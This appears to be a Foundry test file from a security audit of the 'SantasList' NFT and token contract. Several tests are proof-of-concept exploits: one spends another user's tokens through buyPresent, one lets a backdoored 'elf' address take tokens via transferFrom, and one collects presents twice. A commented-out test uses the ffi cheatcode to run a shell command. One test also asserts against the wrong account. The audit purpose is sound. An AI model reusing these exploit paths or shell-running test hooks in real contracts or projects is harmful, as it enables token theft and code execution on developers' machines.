// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {SantasList} from "../../src/SantasList.sol";
import {SantaToken} from "../../src/SantaToken.sol";
import {console, Test} from "forge-std/Test.sol";
import {_CheatCodes} from "../mocks/CheatCodes.t.sol";

contract SantasListTest is Test {
    SantasList santasList;
    SantaToken santaToken;

    address user = makeAddr("user");
    address santa = makeAddr("santa");
    address grinch = makeAddr("grinch");
    address mate = makeAddr("mate");
    address elf = 0x815F577F1c1bcE213c012f166744937C889DAF17;
    _CheatCodes cheatCodes = _CheatCodes(HEVM_ADDRESS);

    function setUp() public {
        vm.startPrank(santa);
        santasList = new SantasList();
        santaToken = SantaToken(santasList.getSantaToken());
        vm.stopPrank();
    }

    function test_incorrectBuyPresent() external {
        // 1. Santa add user to the extra_nice list
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. user collect present: NFT = 1; santaToken = 1e18
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. grinch use the user santaToken to by a present to himself
        vm.prank(grinch);
        santasList.buyPresent(user);
        assertEq(santasList.balanceOf(grinch), 1);
        assertEq(santaToken.balanceOf(user), 0);
    }

    function test_correctOptionForBuyPresent() external {
        // 1. Santa add user to the extra_nice list
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. user collect present: NFT = 1; santaToken = 1e18
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. user buy a present for his mate
        vm.prank(user);
        santasList.buyPresent(mate);
        assertEq(santasList.balanceOf(mate), 1);
        assertEq(santaToken.balanceOf(user), 0);
    }

    modifier executeCollectPresent2Times() {
        // 1. Santa add user to the extra_nice list
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. user collect present: NFT = 1; santaToken = 1e18
        vm.startPrank(user);
        santasList.collectPresent();
        santasList.collectPresent();

        vm.stopPrank();
        _;
    }

    function test_buyPresentWith2e18SantaToken() external executeCollectPresent2Times {
        // 1. We allowed user to collect 2 presents just for this test
        assertEq(santasList.balanceOf(user), 2);
        assertEq(santaToken.balanceOf(user), 2e18);

        // 2. user can buy a present using only 1e18 santaTokens:
        vm.prank(user);
        santasList.buyPresent(mate);
        assertEq(santasList.balanceOf(mate), 1);
        assertEq(santaToken.balanceOf(user), 0);
    }

    function test_manipulatedLibrary() public {
        // 1. Add user to the lists
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. User collect the gift and the santaToken
        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();

        // 3. elf stole the santaToken!
        vm.prank(elf);
        santaToken.transferFrom(user, elf, 1e18);
        assertEq(santaToken.balanceOf(user), 0);
        assertEq(santaToken.balanceOf(elf), 1e18);
    }

    function testCheckList() public {
        vm.prank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
    }

    function testCheckListTwice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        assertEq(uint256(santasList.getNaughtyOrNiceOnce(user)), uint256(SantasList.Status.NICE));
        assertEq(uint256(santasList.getNaughtyOrNiceTwice(user)), uint256(SantasList.Status.NICE));
    }

    function testCantCheckListTwiceWithDifferentThanOnce() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        vm.expectRevert();
        santasList.checkTwice(user, SantasList.Status.NAUGHTY);
        vm.stopPrank();
    }

    function testCantCollectPresentBeforeChristmas() public {
        vm.expectRevert(SantasList.SantasList__NotChristmasYet.selector);
        santasList.collectPresent();
    }

    function testCantCollectPresentIfAlreadyCollected() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        vm.expectRevert(SantasList.SantasList__AlreadyCollected.selector);
        santasList.collectPresent();
    }

    function testCollectPresentNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);
        vm.stopPrank();
    }

    function testCollectPresentExtraNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(mate), 1);
        assertEq(santaToken.balanceOf(user), 1e18);
        vm.stopPrank();
    }

    function testCantCollectPresentUnlessAtLeastNice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NAUGHTY);
        santasList.checkTwice(user, SantasList.Status.NAUGHTY);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        vm.expectRevert();
        santasList.collectPresent();
    }

    function testBuyPresent() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santaToken.approve(address(santasList), 1e18);
        santasList.collectPresent();
        santasList.buyPresent(user);
        assertEq(santasList.balanceOf(user), 2);
        assertEq(santaToken.balanceOf(user), 0);
        vm.stopPrank();
    }

    function testOnlyListCanMintTokens() public {
        vm.expectRevert();
        santaToken.mint(user);
    }

    function testOnlyListCanBurnTokens() public {
        vm.expectRevert();
        santaToken.burn(user);
    }

    function testTokenURI() public {
        string memory tokenURI = santasList.tokenURI(0);
        assertEq(tokenURI, santasList.TOKEN_URI());
    }

    function testGetSantaToken() public {
        assertEq(santasList.getSantaToken(), address(santaToken));
    }

    function testGetSanta() public {
        assertEq(santasList.getSanta(), santa);
    }

    /*
     * What is that???

    function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        cheatCodes.ffi(cmds);
    }
     */
}
